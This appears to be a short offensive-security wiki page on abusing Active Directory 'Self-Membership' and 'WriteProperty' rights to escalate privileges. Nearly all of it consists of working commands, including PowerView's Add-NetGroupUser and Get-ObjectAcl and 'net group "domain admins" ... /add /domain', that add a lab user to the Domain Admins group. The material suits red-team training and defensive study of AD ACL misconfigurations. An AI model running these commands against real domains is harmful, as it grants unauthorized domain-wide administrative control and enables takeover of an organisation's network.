# Self-membership

### <mark style="color:orange;">Self-Membership</mark>

Another privilege that enables the attacker adding themselves to a group:

![](<../../../../.gitbook/assets/image (7).png>)

```
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

### <mark style="color:orange;">WriteProperty (Self-Membership)</mark>

One more privilege that enables the attacker adding themselves to a group:

```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](<../../../../.gitbook/assets/image (51).png>)

```
net group "domain admins" spotless /add /domain
```
